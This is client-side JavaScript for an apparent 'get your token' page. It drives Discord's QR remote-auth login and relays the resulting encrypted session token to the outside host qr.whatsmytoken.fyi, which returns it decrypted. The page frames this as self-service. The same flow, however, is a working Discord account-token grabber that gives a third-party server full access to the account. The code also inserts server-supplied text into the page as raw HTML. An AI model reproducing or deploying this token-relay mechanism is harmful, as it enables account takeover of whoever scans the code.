const WS_URL = `${location.protocol === "https:" ? "wss" : "ws"}://qr.whatsmytoken.fyi/api/v1/qr_code`;
const RECONNECT_DELAY = 500;

const ui = {
    loading: $("#loading-div"),
    qrCodeDiv: $("#qr-code-div"),
    qrCode: $("#qr-code"),
    avatarDiv: $("#avatar-div"),
    avatarImage: $("#avatar-image"),
    mobileIcon: $("#mobile-icon"),
    phonePrompt: $("#phone-prompt"),
    loggingIn: $("#logging-in"),
    discordTag: $("#discord-tag"),
    scanInfo: $("#scan-info"),
    captchaDiv: $("#captcha-div"),
};

let ws = null;
let reconnectTimer = null;
let shouldReconnect = true;

function showLoading() {
    ui.loading.show();
    ui.qrCodeDiv.hide();
    ui.avatarDiv.hide();
    ui.captchaDiv.hide();
    ui.scanInfo.show();
}

function showQr() {
    ui.loading.hide();
    ui.qrCodeDiv.show();
    ui.avatarDiv.hide();
    ui.captchaDiv.hide();
    ui.scanInfo.show();
}

function showAvatar() {
    ui.loading.hide();
    ui.qrCodeDiv.hide();
    ui.avatarDiv.show();
    ui.captchaDiv.hide();
    ui.scanInfo.show();
}

function showCaptcha() {
    ui.loading.hide();
    ui.qrCodeDiv.hide();
    ui.avatarDiv.hide();
    ui.captchaDiv.show();
    ui.scanInfo.hide();
}

function showMessage(html) {
    ui.loading.hide();
    ui.qrCodeDiv.hide();
    ui.avatarDiv.hide();
    ui.captchaDiv.hide();
    ui.scanInfo.html(html).show();
}

function isRetryable(reason) {
    const r = reason.toLowerCase();
    return r.includes("expired") || r.includes("disconnect");
}

function resetUi() {
    ui.phonePrompt.text("Check your phone!");
    ui.loggingIn.text("ing");
    ui.discordTag.text("");
    ui.mobileIcon.attr("src", "assets/img/mobile.png");
    ui.captchaDiv.html("").hide();
    showLoading();
}

function renderQr(url) {
    const qr = qrcode(0, "L");
    qr.addData(url);
    qr.make();
    ui.qrCode.attr("src", qr.createDataURL(4, 8));
}

function sendOp(op, d) {
    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ op, d }));
    }
}

function connect() {
    clearTimeout(reconnectTimer);
    if (ws && (ws.readyState === WebSocket.OPEN || ws.readyState === WebSocket.CONNECTING)) {
        return;
    }

    resetUi();
    ws = new WebSocket(WS_URL);
    ws.onmessage = handleMessage;
    ws.onerror = () => ws.close();
    ws.onclose = () => {
        ws = null;
        if (shouldReconnect) scheduleReconnect();
    };
}

function scheduleReconnect(delay = RECONNECT_DELAY) {
    clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(() => {
        if (shouldReconnect) connect();
    }, delay);
}

async function handleMessage(evt) {
    const data = JSON.parse(evt.data);

    switch (data.op) {
        case "close": {
            const reason = data.reason || "QR code expired";
            toastr.warning(reason);
            if (isRetryable(reason)) {
                // Transiently lost (expired / disconnected) - fetch a fresh code.
                resetUi();
                ws.close();
            } else {
                // Session ended deliberately - display the reason, do not reconnect.
                shouldReconnect = false;
                showMessage(
                    `<span>${reason}</span><br>` +
                        `<a href="javascript:location.reload()">Try again</a>`,
                );
                ws.close();
            }
            break;
        }

        case "qrcode":
            renderQr(data.d);
            showQr();
            break;

        case "data": {
            const d = data.d;
            ui.avatarImage.attr(
                "src",
                `https://cdn.discordapp.com/avatars/${d.id}/${d.avatar}.webp?size=128`,
            );
            ui.discordTag.text(
                d.discrim === "0" ? `@${d.user}` : `${d.user}#${d.discrim}`,
            );
            ui.phonePrompt.text("Check your phone!");
            showAvatar();
            break;
        }

        case "token":
            ui.loggingIn.text("ed");
            ui.phonePrompt.text("Logged in!");
            ui.mobileIcon.attr("src", "assets/img/done.png");
            showAvatar();
            shouldReconnect = false;
            ws.close();
            setTimeout(() => prompt("Here is your token!", data.d), 500);
            break;

        case "ticket":
            await handleTicket(data.d);
            break;
    }
}

async function handleTicket(ticket) {
    try {
        const r = await axios.post(
            "https://discord.com/api/v9/users/@me/remote-auth/login",
            { ticket },
        );
        sendOp("token", r.data.encrypted_token);
    } catch (err) {
        const er = err.response;
        if (er && er.data && er.data.captcha_sitekey) {
            const rqt = er.data.captcha_rqtoken;
            ui.captchaDiv.html(`
                <div class="captcha-wrap">
                    <h-captcha id="signupCaptcha" site-key="${er.data.captcha_sitekey}"
                        theme="dark" size="normal" rqdata="${er.data.captcha_rqdata}"
                        tabindex="0"></h-captcha>
                </div>
                <br>
                <span>Discord added captchas to remote auth, so please complete this.</span>`);
            showCaptcha();
            document
                .getElementById("signupCaptcha")
                .addEventListener("verified", async (e) => {
                    try {
                        const r2 = await axios.post(
                            "https://discord.com/api/v9/users/@me/remote-auth/login",
                            {
                                ticket,
                                captcha_key: e.token,
                                captcha_rqtoken: rqt,
                            },
                        );
                        sendOp("token", r2.data.encrypted_token);
                    } catch (e2) {
                        console.error(e2);
                    }
                });
        } else {
            console.error(err);
        }
    }
}

connect();
